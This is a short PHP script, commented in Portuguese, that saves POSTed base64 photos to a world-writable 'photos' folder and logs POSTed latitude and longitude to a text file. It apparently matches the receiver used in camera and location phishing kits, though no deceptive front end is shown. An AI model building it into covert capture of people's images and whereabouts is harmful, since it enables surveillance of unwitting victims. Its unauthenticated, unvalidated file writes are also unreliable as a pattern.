<?php
// Verifica se os dados da foto foram enviados
if (isset($_POST['photo'])) {
    $data = $_POST['photo'];
    $data = str_replace('data:image/png;base64,', '', $data);
    $data = str_replace(' ', '+', $data);
    $fileData = base64_decode($data);

    // Criar um nome de arquivo único para a imagem
    $file = 'photos/' . uniqid() . '.png';

    // Salvar a imagem na pasta "photos"
    if (!file_exists('photos')) {
        mkdir('photos', 0777, true);  // Criar o diretório se ele não existir
    }

    file_put_contents($file, $fileData);
}

// Verifica se os dados de geolocalização foram enviados
if (isset($_POST['lat']) && isset($_POST['lon'])) {
    $lat = $_POST['lat'];
    $lon = $_POST['lon'];

    // Salvar coordenadas de localização em um arquivo
    $file = fopen("geolocation.txt", "a");
    fwrite($file, "Latitude: " . $lat . ", Longitude: " . $lon . "\n");
    fclose($file);
}
?>
